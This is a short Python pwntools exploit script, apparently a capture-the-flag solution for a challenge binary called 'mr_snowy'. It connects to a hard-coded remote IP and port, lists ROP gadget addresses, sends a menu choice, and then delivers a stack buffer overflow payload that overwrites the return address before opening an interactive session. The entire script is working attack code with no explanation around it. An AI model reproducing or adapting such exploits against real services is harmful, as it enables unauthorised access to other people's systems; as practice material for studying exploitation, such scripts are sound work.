from pwn import *

local = False

host,port = '159.65.57.93','32612'

f = ELF('./mr_snowy')

r = process('./mr_snowy') if local else remote(host,port)


pop_rdi = 0x00000000004015c3
pop_rsi_r15 = 0x00000000004015c1


def first_step(r,c):
	r.sendline(c)
	
	


if __name__ == '__main__':

	log.info(r.recvuntil("> "))
	first_step(r,'1')
	log.info(r.recvuntil("> "))
	# gets 264 bytes

	r.sendline(p64(f.got['puts']+0x40)*9+p64(0x0000000000401165))
	


	r.interactive()

